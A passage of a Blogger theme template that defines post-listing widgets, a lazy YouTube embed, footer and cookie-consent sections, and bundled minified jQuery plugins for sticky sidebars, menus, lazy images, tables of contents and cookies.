            <b:includable id='bylineRegion' var='regionItems'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='commentsLink'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='commentsLinkIframe'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='content' var='post'>
      <div>
        <b:if cond='data:widget.sectionId == &quot;featured&quot;'>
          <b:class expr:name='data:i in [0,1,2] ? &quot;featured-item card-style item-&quot;+data:i : &quot;featured-item item-&quot;+data:i'/>
          <a expr:class='data:i in [0,1,2] ? &quot;entry-image-wrap before-mask&quot; : &quot;entry-image-wrap&quot;' expr:href='data:post.url.canonical' expr:title='data:post.title ? data:post.title : data:messages.noTitle'><b:if cond='data:post.featuredImage'><span class='entry-thumb' expr:data-image='data:post.featuredImage.isYouTube ? resizeImage(data:post.featuredImage.youtubeMaxResDefaultUrl.jsonEscaped, 72, &quot;1:1&quot;) : resizeImage(data:post.featuredImage, 72, &quot;1:1&quot;)'/><b:else/><span class='entry-thumb' data-image='https://resources.blogblog.com/img/blank.gif'/></b:if><b:class expr:name='data:post.featuredImage.isYouTube ? &quot;is-video&quot; : &quot;is-image&quot;'/></a>
          <div expr:class='data:i in [0,1,2] ? &quot;entry-header entry-info&quot; : &quot;entry-header&quot;'>
            <b:if cond='data:i in [0,1,2] and data:post.labels'><span class='entry-category'><data:post.labels.first.name/></span></b:if>
            <h2 class='entry-title'><a expr:href='data:post.url.canonical' expr:title='data:post.title ? data:post.title : data:messages.noTitle'><b:eval expr='data:post.title ? data:post.title : data:messages.noTitle'/></a></h2>
            <b:if cond='data:i in [0,1,2]'><b:if cond='data:widgets.Blog.first.allBylineItems.author or data:widgets.Blog.first.allBylineItems.timestamp'><div class='entry-meta'><b:if cond='data:widgets.Blog.first.allBylineItems.author'><span class='entry-author mi'><b:if cond='data:widgets.Blog.first.allBylineItems.author.label'><span class='sp'><data:widgets.Blog.first.allBylineItems.author.label/></span></b:if><span class='author-name'><data:post.author.name/></span></span></b:if><b:if cond='data:widgets.Blog.first.allBylineItems.timestamp'><span class='entry-time mi'><b:if cond='data:widgets.Blog.first.allBylineItems.author and data:widgets.Blog.first.allBylineItems.timestamp.label'><span class='sp'><data:widgets.Blog.first.allBylineItems.timestamp.label/></span></b:if><time class='published' expr:datetime='data:post.date.iso8601'><data:post.date/></time></span></b:if></div></b:if><b:else/><b:if cond='data:widgets.Blog.first.allBylineItems.timestamp'><div class='entry-meta'><span class='entry-time mi'><time class='published' expr:datetime='data:post.date.iso8601'><data:post.date/></time></span></div></b:if></b:if>
            <b:if cond='data:i == 0'><span class='entry-excerpt excerpt'><b:eval expr='data:post.snippets.long snippet { length: 150 }'/></span></b:if>
          </div>
          <b:else/>
          <b:class expr:name='data:i == 0 ? &quot;default-item card-style item-&quot;+data:i : &quot;default-item item-&quot;+data:i'/>
          <a expr:class='data:i == 0 ? &quot;entry-image-wrap before-mask&quot; : &quot;entry-image-wrap&quot;' expr:href='data:post.url.canonical' expr:title='data:post.title ? data:post.title : data:messages.noTitle'><b:if cond='data:post.featuredImage'><span class='entry-thumb' expr:data-image='data:post.featuredImage.isYouTube ? resizeImage(data:post.featuredImage.youtubeMaxResDefaultUrl.jsonEscaped, 72, &quot;1:1&quot;) : resizeImage(data:post.featuredImage, 72, &quot;1:1&quot;)'/><b:else/><span class='entry-thumb' data-image='https://resources.blogblog.com/img/blank.gif'/></b:if><b:class expr:name='data:post.featuredImage.isYouTube ? &quot;is-video&quot; : &quot;is-image&quot;'/></a>
          <div expr:class='data:i == 0 ? &quot;entry-header entry-info&quot; : &quot;entry-header&quot;'>
            <b:if cond='data:post.labels and (data:i == 0)'><span class='entry-category'><data:post.labels.first.name/></span></b:if>
            <h2 class='entry-title'><a expr:href='data:post.url.canonical' expr:title='data:post.title ? data:post.title : data:messages.noTitle'><b:eval expr='data:post.title ? data:post.title : data:messages.noTitle'/></a></h2>
            <b:if cond='data:i == 0'><b:if cond='data:widgets.Blog.first.allBylineItems.author or data:widgets.Blog.first.allBylineItems.timestamp'><div class='entry-meta'><b:if cond='data:widgets.Blog.first.allBylineItems.author'><span class='entry-author mi'><b:if cond='data:widgets.Blog.first.allBylineItems.author.label'><span class='sp'><data:widgets.Blog.first.allBylineItems.author.label/></span></b:if><span class='author-name'><data:post.author.name/></span></span></b:if><b:if cond='data:widgets.Blog.first.allBylineItems.timestamp'><span class='entry-time mi'><b:if cond='data:widgets.Blog.first.allBylineItems.author and data:widgets.Blog.first.allBylineItems.timestamp.label'><span class='sp'><data:widgets.Blog.first.allBylineItems.timestamp.label/></span></b:if><time class='published' expr:datetime='data:post.date.iso8601'><data:post.date/></time></span></b:if></div></b:if><b:else/><b:if cond='data:widgets.Blog.first.allBylineItems.timestamp'><div class='entry-meta'><span class='entry-time mi'><time class='published' expr:datetime='data:post.date.iso8601'><data:post.date/></time></span></div></b:if></b:if>
          </div>
        </b:if>
      </div>
    </b:includable>
            <b:includable id='emailPostIcon'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='facebookShare'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='footerBylines'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='googlePlusShare'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='headerByline'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='linkShare'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='otherSharingButton'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='platformShare'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='postAuthor'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='postCommentsLink'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='postJumpLink' var='post'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='postLabels'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='postLocation'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='postReactions'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='postShareButtons'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='postTimestamp'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='sharingButton'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='sharingButtonContent'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='sharingButtons'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='sharingButtonsMenu'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='sharingPlatformIcon'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='snippetedPostByline'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='snippetedPostContent'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='snippetedPostThumbnail'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='snippetedPostTitle'><b:comment>Replaced</b:comment></b:includable>
            <b:includable id='snippetedPosts'><b:comment>Replaced</b:comment></b:includable>
          </b:widget>
          <b:widget id='HTML8' locked='false' title='Latest Reviews' type='HTML' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='content'>{getContent} $results={4} $label={recent} $type={mini}</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
              <b:include name='html-content'/>
            </b:includable>
          </b:widget>
          <b:widget id='HTML19' locked='false' title='Subscribe Us' type='HTML' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='content'>&lt;div class=&quot;youtube-player&quot; data-id=&quot;gwQNzQpgd6c&quot; /&gt;
&lt;style&gt;
.youtube-player {
  position: relative;
  padding-bottom: 56.25%;
  height: 0;
  overflow: hidden;
  max-width: 100%;
  background: #000;
  margin: 5px;
}

.youtube-player iframe {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  z-index: 100;
  background: transparent;
}

.youtube-player img {
  object-fit: cover;
  display: block;
  left: 0;
  bottom: 0;
  margin: auto;
  max-width: 100%;
  width: 100%;
  position: absolute;
  right: 0;
  top: 0;
  border: none;
  height: auto;
  cursor: pointer;
  -webkit-transition: 0.4s all;
  -moz-transition: 0.4s all;
  transition: 0.4s all;
}

.youtube-player img:hover {
  -webkit-filter: brightness(75%);
  -moz-filter: brightness(75%);
  filter: brightness(75%);
}

.youtube-player .play {
  height: 72px;
  width: 72px;
  left: 50%;
  top: 50%;
  margin-left: -36px;
  margin-top: -36px;
  position: absolute;
   background: url(&quot;https://1.bp.blogspot.com/-9WM7CTGFE6w/YEIY4yiXrSI/AAAAAAAAKLA/KQ9KQqUFQ-omzPDInJqiorJHHIVvrSu2QCNcBGAsYHQ/s16000/play-button.png&quot;) no-repeat;
  cursor: pointer;
}

&lt;/style&gt;
&lt;script type=&#39;text/javascript&#39;&gt;
//&lt;![CDATA[
/* Light YouTube Embeds by @labnol */
/* Web: https://www.labnol.org/ */

function labnolIframe(div) {
  var iframe = document.createElement(&quot;iframe&quot;);
  iframe.setAttribute(
    &quot;src&quot;,
    &quot;https://www.youtube.com/embed/&quot; + div.dataset.id + &quot;?autoplay=1&amp;rel=0&quot;
  );
  iframe.setAttribute(&quot;frameborder&quot;, &quot;0&quot;);
  iframe.setAttribute(&quot;allowfullscreen&quot;, &quot;1&quot;);
  iframe.setAttribute(
    &quot;allow&quot;,
    &quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot;
  );
  div.parentNode.replaceChild(iframe, div);
}

function initYouTubeVideos() {
  var playerElements = document.getElementsByClassName(&quot;youtube-player&quot;);
  for (var n = 0; n &lt; playerElements.length; n++) {
    var videoId = playerElements[n].dataset.id;
    var div = document.createElement(&quot;div&quot;);
    div.setAttribute(&quot;data-id&quot;, videoId);
    var thumbNode = document.createElement(&quot;img&quot;);
    thumbNode.src = &quot;https://i.ytimg.com/vi/ID/hqdefault.jpg&quot;.replace(
      &quot;ID&quot;,
      videoId
    );
    div.appendChild(thumbNode);
    var playButton = document.createElement(&quot;div&quot;);
    playButton.setAttribute(&quot;class&quot;, &quot;play&quot;);
    div.appendChild(playButton);
    div.onclick = function () {
      labnolIframe(this);
    };
    playerElements[n].appendChild(div);
  }
}
document.addEventListener(&quot;DOMContentLoaded&quot;, initYouTubeVideos);
//]]&gt;
&lt;/script&gt;&lt;/div&gt;</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
          </b:widget>
          <b:widget id='HTML5' locked='false' title='Comments' type='HTML' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='content'>{getContent} $results={3} $type={comments}</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
          </b:widget>
          <b:widget id='Label2' locked='false' title='Main Tags' type='Label' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='sorting'>ALPHA</b:widget-setting>
              <b:widget-setting name='display'>CLOUD</b:widget-setting>
              <b:widget-setting name='selectedLabelsList'/>
              <b:widget-setting name='showType'>ALL</b:widget-setting>
              <b:widget-setting name='showFreqNumbers'>true</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
            <b:includable id='cloud'>
      <ul class='cloud-style'>
        <b:loop values='data:labels' var='label'>
          <li><a class='label-name btn' expr:href='data:label.url'><data:label.name/><b:if cond='data:this.showFreqNumbers'><b:class name='has-count'/><span class='label-count count-style'>(<data:label.count/>)</span></b:if></a></li>
        </b:loop>
      </ul>
    </b:includable>
            <b:includable id='content'>
      <div class='widget-content'>
        <b:class expr:name='data:this.display + &quot;-label&quot;'/>
        <b:include cond='data:this.display == &quot;list&quot;' name='list'/>
        <b:include cond='data:this.display == &quot;cloud&quot;' name='cloud'/>
      </div>
    </b:includable>
            <b:includable id='list'>
      <ul class='list-style'>
        <b:loop values='data:labels' var='label'>
          <li><a class='label-name' expr:href='data:label.url'><data:label.name/><b:if cond='data:this.showFreqNumbers'><b:class name='has-count'/><span class='label-count count-style'>(<data:label.count/>)</span></b:if></a></li>
        </b:loop>
      </ul>
    </b:includable>
          </b:widget>
        </b:section>
      </aside>
    </div>
  </div>
  <b:if cond='data:view.isLayoutMode or (data:view.isHomepage and (data:widgets any w =&gt; w.sectionId == &quot;footer-ads&quot;)) or (data:view.isPost and (data:skin.vars.footerad_onpost == &quot;1px&quot;) and (data:widgets any w =&gt; w.sectionId == &quot;footer-ads&quot;))'>
    <!-- Footer Ads -->
    <div class='flex-center' id='footer-ads-wrap'>
      <b:section class='footer-ads container row-x1' id='footer-ads' maxwidgets='1' name='Footer ADS' showaddelement='yes'>
        <b:widget id='HTML3' locked='false' title='Ads' type='HTML' visible='true'>
          <b:widget-settings>
            <b:widget-setting name='content'><![CDATA[<a class="ads-here" href="https://www.am2z.com/">Responsive Advertisement</a>]]></b:widget-setting>
          </b:widget-settings>
          <b:includable id='main'>
      <b:include name='html-content'/>
    </b:includable>
        </b:widget>
      </b:section>
    </div>
  </b:if>
  <!-- Footer Wrapper -->
  <footer id='footer-wrapper'>
    <div class='primary-footer flex-center'>
      <b:class cond='data:widgets none w =&gt; w.sectionId == &quot;razer-pro-about-section&quot;' name='no-widget'/>
      <b:class cond='data:skin.vars.footer_bg == data:skin.vars.footerbar_bg' name='has-border'/>
      <div class='container row-x1'>
        <b:section class='razer-pro-about-section' id='razer-pro-about-section' maxwidgets='2' name='About Section' showaddelement='yes'>
          <b:widget id='Image101' locked='true' title='About Us' type='Image' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='displayUrl'>https://lh3.googleusercontent.com/-h6ZyBAA7eGw/YLJD2ssz2eI/AAAAAAAAK00/Q1jwTbVbUZkvLWYLdwg7W1N3bVKVIsprgCNcBGAsYHQ/Razer-logo-New.png</b:widget-setting>
              <b:widget-setting name='displayHeight'>48</b:widget-setting>
              <b:widget-setting name='sectionWidth'>150</b:widget-setting>
              <b:widget-setting name='shrinkToFit'>false</b:widget-setting>
              <b:widget-setting name='displayWidth'>257</b:widget-setting>
              <b:widget-setting name='link'>/</b:widget-setting>
              <b:widget-setting name='caption'><![CDATA[Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's.]]></b:widget-setting>
            </b:widget-settings>
            <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
            <b:includable id='content'>
      <b:include name='image-content'/>
    </b:includable>
          </b:widget>
          <b:widget id='LinkList103' locked='true' title='Follow Us' type='LinkList' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='link-3'>https://www.mrjaz.com/</b:widget-setting>
              <b:widget-setting name='sorting'>NONE</b:widget-setting>
              <b:widget-setting name='link-4'>https://www.mrjaz.com/</b:widget-setting>
              <b:widget-setting name='text-1'>twitter</b:widget-setting>
              <b:widget-setting name='link-1'>https://am2z.com/</b:widget-setting>
              <b:widget-setting name='text-0'>facebook</b:widget-setting>
              <b:widget-setting name='link-2'>https://www.mrjaz.com/</b:widget-setting>
              <b:widget-setting name='text-3'>instagram</b:widget-setting>
              <b:widget-setting name='link-0'>https://www.am2z.com/</b:widget-setting>
              <b:widget-setting name='text-2'>youtube</b:widget-setting>
              <b:widget-setting name='text-4'>rss</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
            <b:includable id='content'>
      <b:include name='linklist-content'/>
    </b:includable>
          </b:widget>
        </b:section>
      </div>
    </div>
    <div class='footerbar flex-center'>
      <div class='container row-x1'>
        <b:section class='footer-copyright' id='footer-copyright' maxwidgets='1' name='Footer Copyright' showaddelement='yes'>
          <b:widget id='Text101' locked='true' title='Footer Credits' type='Text' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='content'><![CDATA[Paid by - <a href="https://www.mrjaz.com/" title="www.mrjaz.com" target="_blank">mrjaz.com</a>]]></b:widget-setting>
            </b:widget-settings>
            <b:includable id='main'>
      <b:include name='text-content'/>
    </b:includable>
          </b:widget>
        </b:section>
        <b:section class='footer-menu' id='footer-menu' maxwidgets='1' name='Footer Menu' showaddelement='yes'>
          <b:widget id='LinkList104' locked='true' title='Link List' type='LinkList' visible='true'>
            <b:widget-settings>
              <b:widget-setting name='link-3'>/?hl=ar</b:widget-setting>
              <b:widget-setting name='sorting'>NONE</b:widget-setting>
              <b:widget-setting name='text-1'>About Us</b:widget-setting>
              <b:widget-setting name='link-1'>https://www.mrjaz.com</b:widget-setting>
              <b:widget-setting name='text-0'>Home</b:widget-setting>
              <b:widget-setting name='link-2'>https://www.mrjaz.com</b:widget-setting>
              <b:widget-setting name='text-3'>RTL Version</b:widget-setting>
              <b:widget-setting name='link-0'>/</b:widget-setting>
              <b:widget-setting name='text-2'>Contact Us</b:widget-setting>
            </b:widget-settings>
            <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
            <b:includable id='content'>
      <b:include name='linklist-content'/>
    </b:includable>
          </b:widget>
        </b:section>
      </div>
    </div>
  </footer>
  <b:if cond='data:view.isLayoutMode or (data:widgets.Text any w =&gt; w.sectionId == &quot;razer-pro-cookie-ify-section&quot;)'>
    <!-- Cookie Consent -->
    <div id='razer-pro-cookie-ify'>
      <b:section id='razer-pro-cookie-ify-section' maxwidgets='1' name='Cookie Consent' showaddelement='no'>
        <b:widget id='Text1' locked='true' title='$ok={Accept !} $days={7}' type='Text' visible='true'>
          <b:widget-settings>
            <b:widget-setting name='content'><![CDATA[Our website uses cookies to improve your experience. <a href="https://www.mrjaz.com/">Learn more</a>]]></b:widget-setting>
          </b:widget-settings>
          <b:includable id='main'>
      <b:include name='text-content'/>
    </b:includable>
        </b:widget>
      </b:section>
    </div>
  </b:if>
</div>
<!-- Mobile Menu and Back Top -->
<div id='slide-menu'>
  <div class='slide-menu-header'>
    <div class='mobile-search'>
      <form class='search-form' expr:action='data:blog.searchUrl' role='search'>
        <input autocomplete='off' class='search-input' expr:placeholder='data:messages.search' name='q' type='search' value=''/>
        <button class='search-action' type='submit' value=''/>
      </form>
    </div>
    <a class='hide-razer-pro-mobile-menu' href='javascript:;' role='button'/>
  </div>
  <div class='slide-menu-flex'>
    <div class='razer-pro-mobile-menu' id='razer-pro-mobile-menu'/>
    <div class='mm-footer'>
      <div class='mm-social'/>
      <div class='mm-menu'/>
    </div>
  </div>
</div>
<div class='overlay'/>
<a class='btn' href='javascript:;' id='back-top' role='button' title='Back To Top'/>
<b:if cond='data:view.isSingleItem'>
<!-- Hidden Widgets -->
<div id='hidden-widgets-wrap' style='display:none'>
  <b:section class='hidden-widgets' deleted='true' id='hidden-widgets' maxwidgets='1' showaddelement='no'>
    <b:widget id='ContactForm1' locked='true' title='Contact form' type='ContactForm' visible='true'>
      <b:includable id='main' var='this'>
      <b:include name='widget-title'/>
      <b:include name='content'/>
    </b:includable>
      <b:includable id='content'>
      <b:include name='contact-form-content'/>
    </b:includable>
    </b:widget>
  </b:section>
</div>
</b:if>
<b:include name='theme-options-js'/>
<!-- Hosted Plugins -->
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js' type='text/javascript'/>
<!-- Local Plugins -->
<script type='text/javascript'>
//<![CDATA[
/*! Custom - Theia Sticky Sidebar | v1.7.0 - https://github.com/WeCodePixels/theia-sticky-sidebar */
!function(i){i.fn.theiaStickySidebar=function(t){function e(t,e){return!0===t.initialized||!(i("body").width()<t.minWidth)&&(function(t,e){t.initialized=!0,0===i("#theia-sticky-sidebar-stylesheet-"+t.namespace).length&&i("head").append(i('<style id="theia-sticky-sidebar-stylesheet-'+t.namespace+'">.theiaStickySidebar:after {content: ""; display: table; clear: both;}</style>'));e.each(function(){var e={};if(e.sidebar=i(this),e.options=t||{},e.container=i(e.options.containerSelector),0==e.container.length&&(e.container=e.sidebar.parent()),e.sidebar.parents().css("-webkit-transform","none"),e.sidebar.css({position:e.options.defaultPosition,overflow:"visible","-webkit-box-sizing":"border-box","-moz-box-sizing":"border-box","box-sizing":"border-box"}),e.stickySidebar=e.sidebar.find(".theiaStickySidebar"),0==e.stickySidebar.length){var a=/(?:text|application)\/(?:x-)?(?:javascript|ecmascript)/i;e.sidebar.find("script").filter(function(i,t){return 0===t.type.length||t.type.match(a)}).remove(),e.stickySidebar=i("<div>").addClass("theiaStickySidebar").append(e.sidebar.children()),e.sidebar.append(e.stickySidebar)}e.marginBottom=parseInt(e.sidebar.css("margin-bottom")),e.paddingTop=parseInt(e.sidebar.css("padding-top")),e.paddingBottom=parseInt(e.sidebar.css("padding-bottom"));var n=e.stickySidebar.offset().top,s=e.stickySidebar.outerHeight();function d(){e.fixedScrollTop=0,e.sidebar.css({"min-height":"1px"}),e.stickySidebar.css({position:"static",width:"",transform:"none"})}e.stickySidebar.css("padding-top",1),e.stickySidebar.css("padding-bottom",1),n-=e.stickySidebar.offset().top,s=e.stickySidebar.outerHeight()-s-n,0==n?(e.stickySidebar.css("padding-top",0),e.stickySidebarPaddingTop=0):e.stickySidebarPaddingTop=1,0==s?(e.stickySidebar.css("padding-bottom",0),e.stickySidebarPaddingBottom=0):e.stickySidebarPaddingBottom=1,e.previousScrollTop=null,e.fixedScrollTop=0,d(),e.onScroll=function(e){if(e.stickySidebar.is(":visible"))if(i("body").width()<e.options.minWidth)d();else{if(e.options.disableOnResponsiveLayouts){var a=e.sidebar.outerWidth("none"==e.sidebar.css("float"));if(a+50>e.container.width())return void d()}var n,s,r=i(document).scrollTop(),c="static";if(r>=e.sidebar.offset().top+(e.paddingTop-e.options.additionalMarginTop)){var p,b=e.paddingTop+t.additionalMarginTop,l=e.paddingBottom+e.marginBottom+t.additionalMarginBottom,f=e.sidebar.offset().top,h=e.sidebar.offset().top+(n=e.container,s=n.height(),n.children().each(function(){s=Math.max(s,i(this).height())}),s),g=0+t.additionalMarginTop,S=e.stickySidebar.outerHeight()+b+l<i(window).height();p=S?g+e.stickySidebar.outerHeight():i(window).height()-e.marginBottom-e.paddingBottom-t.additionalMarginBottom;var u=f-r+e.paddingTop,m=h-r-e.paddingBottom-e.marginBottom,y=e.stickySidebar.offset().top-r,k=e.previousScrollTop-r;"fixed"==e.stickySidebar.css("position")&&"modern"==e.options.sidebarBehavior&&(y+=k),"stick-to-top"==e.options.sidebarBehavior&&(y=t.additionalMarginTop),"stick-to-bottom"==e.options.sidebarBehavior&&(y=p-e.stickySidebar.outerHeight()),y=k>0?Math.min(y,g):Math.max(y,p-e.stickySidebar.outerHeight()),y=Math.max(y,u),y=Math.min(y,m-e.stickySidebar.outerHeight());var v=e.container.height()==e.stickySidebar.outerHeight();c=(v||y!=g)&&(v||y!=p-e.stickySidebar.outerHeight())?r+y-e.sidebar.offset().top-e.paddingTop<=t.additionalMarginTop?"static":"absolute":"fixed"}if("fixed"==c){var x=i(document).scrollLeft();e.stickySidebar.css({position:"fixed",width:o(e.stickySidebar)+"px",transform:"translateY("+y+"px)",left:e.sidebar.offset().left+parseInt(e.sidebar.css("padding-left"))-x+"px",top:"0px"})}else if("absolute"==c){var T={};"absolute"!=e.stickySidebar.css("position")&&(T.position="absolute",T.transform="translateY("+(r+y-e.sidebar.offset().top-e.stickySidebarPaddingTop-e.stickySidebarPaddingBottom)+"px)",T.top="0px"),T.width=o(e.stickySidebar)+"px",T.left="",e.stickySidebar.css(T)}else"static"==c&&d();"static"!=c&&1==e.options.updateSidebarHeight&&e.sidebar.css({"min-height":e.stickySidebar.outerHeight()+e.stickySidebar.offset().top-e.sidebar.offset().top+e.paddingBottom}),e.previousScrollTop=r}},e.onScroll(e),i(document).on("scroll."+e.options.namespace,function(i){return function(){i.onScroll(i)}}(e)),i(window).on("resize."+e.options.namespace,function(i){return function(){i.stickySidebar.css({position:"static"}),i.onScroll(i)}}(e)),"undefined"!=typeof ResizeSensor&&new ResizeSensor(e.stickySidebar[0],function(i){return function(){i.onScroll(i)}}(e))})}(t,e),!0)}function o(i){var t;try{t=i[0].getBoundingClientRect().width}catch(i){}return void 0===t&&(t=i.width()),t}return(t=i.extend({containerSelector:"",additionalMarginTop:0,additionalMarginBottom:0,updateSidebarHeight:!0,minWidth:0,disableOnResponsiveLayouts:!0,sidebarBehavior:"modern",defaultPosition:"relative",namespace:"TSS"},t)).additionalMarginTop=parseInt(t.additionalMarginTop)||0,t.additionalMarginBottom=parseInt(t.additionalMarginBottom)||0,function(t,o){e(t,o)||(console.log("TSS: Body width smaller than options.minWidth. Init is delayed."),i(document).on("scroll."+t.namespace,function(t,o){return function(a){var n=e(t,o);n&&i(this).unbind(a)}}(t,o)),i(window).on("resize."+t.namespace,function(t,o){return function(a){var n=e(t,o);n&&i(this).unbind(a)}}(t,o)))}(t,this),this}}(jQuery);

/*! MenuIfy by Templateify | v1.0.0 - https://www.templateify.com */
!function(a){a.fn.menuify=function(){return this.each(function(){var $t=a(this),b=$t.find('.LinkList ul > li').children('a'),c=b.length;for(var i=0;i<c;i++){var d=b.eq(i),h=d.text();if(h.charAt(0)!=='_'){var e=b.eq(i+1),j=e.text();if(j.charAt(0)==='_'){var m=d.parent();m.append('<ul class="sub-menu m-sub"/>');}}if(h.charAt(0)==='_'){d.text(h.replace('_',''));d.parent().appendTo(m.children('.sub-menu'));}}for(var i=0;i<c;i++){var f=b.eq(i),k=f.text();if(k.charAt(0)!=='_'){var g=b.eq(i+1),l=g.text();if(l.charAt(0)==='_'){var n=f.parent();n.append('<ul class="sub-menu2 m-sub"/>');}}if(k.charAt(0)==='_'){f.text(k.replace('_',''));f.parent().appendTo(n.children('.sub-menu2'));}}$t.find('.LinkList ul li ul').parent('li').addClass('has-sub');});}}(jQuery);

/*! LazyIfy on Scroll by Templateify | v1.6.0 - https://www.templateify.com */
!function(n){n.fn.lazyify=function(){return this.each(function(){var o,t=n(this),a=n(window),e=t.attr("data-image"),h="w"+Math.round(t.width()+t.width()/10)+"-h"+Math.round(t.height()+t.height()/10)+"-p-k-no-nu";noThumbnail="undefined"!=typeof noThumbnail?noThumbnail:"//4.bp.blogspot.com/-eALXtf-Ljts/WrQYAbzcPUI/AAAAAAAABjY/vptx-N2H46oFbiCqbSe2JgVSlHhyl0MwQCK4BGAYYCw/s72-c/nth-ify.png",e.match("resources.blogblog.com")&&(e=noThumbnail),o=e.match("/s72-c")?e.replace("/s72-c","/"+h):e.match("/w72-h")?e.replace("/w72-h72-p-k-no-nu","/"+h):e.match("=w72-h")?e.replace("=w72-h72-p-k-no-nu","="+h):e,t.is(":hidden")||a.on("load resize scroll",function n(){if(a.scrollTop()+a.height()>=t.offset().top){a.off("load resize scroll",n);var e=new Image;e.onload=function(){t.attr("style","background-image:url("+this.src+")").addClass("lazy-ify")},e.src=o}}).trigger("scroll")})}}(jQuery);

/*! jQuery replaceText | v1.1.0 - https://benalman.com/projects/jquery-replacetext-plugin/ */
!function(e){e.fn.replaceText=function(n,t,i){return this.each(function(){var o,r,l=this.firstChild,u=[];if(l)do{3===l.nodeType&&(r=(o=l.nodeValue).replace(n,t))!==o&&(!i&&/</.test(r)?(e(l).before(r),u.push(l)):l.nodeValue=r)}while(l=l.nextSibling);u.length&&e(u).remove()})}}(jQuery);

/*! Table of Contents | v0.4.0 - https://github.com/ndabas/toc */
!function(t){"use strict";var n=function(n){return this.each(function(){var e,i,a=t(this),o=a.data(),c=[a],r=this.tagName,d=0;e=t.extend({content:"body",headings:"h1,h2,h3"},{content:o.toc||void 0,headings:o.tocHeadings||void 0},n),i=e.headings.split(","),t(e.content).find(e.headings).attr("id",function(n,e){return e||function(t){0===t.length&&(t="?");for(var n=t.replace(/\s+/g,"_"),e="",i=1;null!==document.getElementById(n+e);)e="_"+i++;return n+e}(t(this).text())}).each(function(){var n=t(this),e=t.map(i,function(t,e){return n.is(t)?e:void 0})[0];if(e>d){var a=c[0].children("li:last")[0];a&&c.unshift(t("<"+r+"/>").appendTo(a))}else c.splice(0,Math.min(d-e,Math.max(c.length-1,0)));t("<li/>").appendTo(c[0]).append(t("<a/>").text(n.text()).attr("href","#"+n.attr("id"))),d=e})})},e=t.fn.toc;t.fn.toc=n,t.fn.toc.noConflict=function(){return t.fn.toc=e,this},t(function(){n.call(t("[data-toc]"))})}(window.jQuery);

/*! Javascript Cookie | v1.5.1 - https://github.com/js-cookie/js-cookie */
!function(e){var n;if("function"==typeof define&&define.amd)define(["jquery"],e);else if("object"==typeof exports){try{n=require("jquery")}catch(e){}module.exports=e(n)}else{var o=window.Cookies,r=window.Cookies=e(window.jQuery);r.noConflict=function(){return window.Cookies=o,r}}}(function(e){var n=/\+/g;function o(e){return u.raw?e:encodeURIComponent(e)}function r(e){return o(u.json?JSON.stringify(e):String(e))}function t(e,o){var r=u.raw?e:function(e){0===e.indexOf('"')&&(e=e.slice(1,-1).replace(/\\"/g,'"').replace(/\\\\/g,"\\"));try{return e=decodeURIComponent(e.replace(n," ")),u.json?JSON.parse(e):e}catch(e){}}(e);return c(o)?o(r):r}function i(){for(var e,n,o=0,r={};o<arguments.length;o++)for(e in n=arguments[o])r[e]=n[e];return r}function c(e){return"[object Function]"===Object.prototype.toString.call(e)}var u=function(e,n,f){if(arguments.length>1&&!c(n)){if("number"==typeof(f=i(u.defaults,f)).expires){var s=f.expires,a=f.expires=new Date;a.setMilliseconds(a.getMilliseconds()+864e5*s)}return document.cookie=[o(e),"=",r(n),f.expires?"; expires="+f.expires.toUTCString():"",f.path?"; path="+f.path:"",f.domain?"; domain="+f.domain:"",f.secure?"; secure":""].join("")}for(var d,p=e?void 0:{},l=document.cookie?document.cookie.split("; "):[],m=0,v=l.length;m<v;m++){var g=l[m].split("="),w=(d=g.shift(),u.raw?d:decodeURIComponent(d)),j=g.join("=");if(e===w){p=t(j,n);break}e||void 0===(j=t(j))||(p[w]=j)}return p};return u.get=u.set=u,u.defaults={},u.remove=function(e,n){return 